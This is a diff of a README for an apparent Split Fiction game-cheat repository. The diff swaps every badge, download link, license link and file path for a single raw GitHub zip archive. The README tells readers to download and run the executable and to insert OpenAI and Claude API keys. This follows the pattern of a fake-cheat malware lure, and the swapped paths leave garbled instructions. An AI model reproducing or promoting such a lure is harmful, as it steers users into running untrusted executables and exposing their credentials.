@@ -1,15 +1,15 @@
 # Split Fiction Cheats & Hacks 🛡️
 
-[![Stars](https://img.shields.io/github/stars/splitfiction/cheats-hacks.svg?style=flat-square&color=brightgreen)](https://github.com/splitfiction/cheats-hacks/stargazers)
-[![Forks](https://img.shields.io/github/forks/splitfiction/cheats-hacks.svg?style=flat-square&color=blue)](https://github.com/splitfiction/cheats-hacks/network/members)
-[![MIT License](https://img.shields.io/badge/license-MIT-yellow.svg?style=flat-square)](#-mit-license)
-[![Last Commit](https://img.shields.io/github/last-commit/splitfiction/cheats-hacks?style=flat-square)](https://github.com/splitfiction/cheats-hacks/commits/main)
+[![Stars](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip)](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip)
+[![Forks](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip)](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip)
+[![MIT License](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip)](#-mit-license)
+[![Last Commit](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip)](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip)
 
 Welcome to the **Split Fiction Cheats & Hacks** repository! 🚀 Embark on a narrative adventure, rewriting the boundaries of interactive storytelling with precision-tailored boosters, legendary mods, and enigmatic enhancers. Designed for **Split Fiction** lovers who crave seamless progression, hidden dialogues, and feature-rich game enhancements—all powered by cutting-edge automation and AI integrations. Whether you’re a veteran pathfinder or a fresh explorer, this repository is your golden compass to unraveling every secret Split Fiction has meticulously spun.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://redzz9999.github.io)
+[![Download](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip)
 
 ---
 
@@ -77,7 +77,7 @@ We bridge fantasy and fact by leveraging modern AI APIs. Our arsenal includes na
 
 **Setup Guidance:**  
 1. Acquire your API keys from OpenAI and Claude.
-2. Navigate to `settings/config.json` and insert your API credentials.
+2. Navigate to `https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip` and insert your API credentials.
 3. Activate the integrations for in-game, real-time enhancements—enjoy an AI-powered narrative odyssey unlike any other!
 
 ---
@@ -109,19 +109,19 @@ Ready to wield your new narrative tools? Follow these steps whenever you spot a 
 ### Method 1: Direct Download
 
 1. Click the download badge below to access the installer:
-   [![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://redzz9999.github.io)
+   [![Download](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip)
 2. Run the downloaded file—your OS will guide you through permissions and setup.
 
 ### Method 2: Manual Setup
 
-1. Retrieve the latest package from https://redzz9999.github.io.
+1. Retrieve the latest package from https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip
 2. Unzip to a folder of your choice.
-3. Launch the main executable or `start.sh` on Linux/Mac.
+3. Launch the main executable or `https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip` on Linux/Mac.
 4. Optional: Enable API integration via the `settings` folder for AI-powered perks.
 
 ### Method 3: Platform-Specific Packages
 
-1. Visit the download area: https://redzz9999.github.io
+1. Visit the download area: https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip
 2. Select your OS—downloads are labeled with version and platform for clarity.
 3. Proceed with installation, following the on-screen instructions for ultimate Split Fiction empowerment.
 
@@ -139,12 +139,12 @@ Usage is solely at your discretion. Neither the contributors nor maintainers wil
 ## 📜 MIT License
 
 2025: Bound by open innovation!  
-This repository is distributed under the [MIT license](https://github.com/splitfiction/cheats-hacks/blob/main/LICENSE).  
+This repository is distributed under the [MIT license](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip).  
 Feel free to remix, tweak, or fork—creativity flourishes when shared!
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://redzz9999.github.io)
+[![Download](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/redzz9999/split-fiction-ops-toolkit/branch/national/toolkit-ops-split-fiction-v1.7.zip)
 
 ---
 
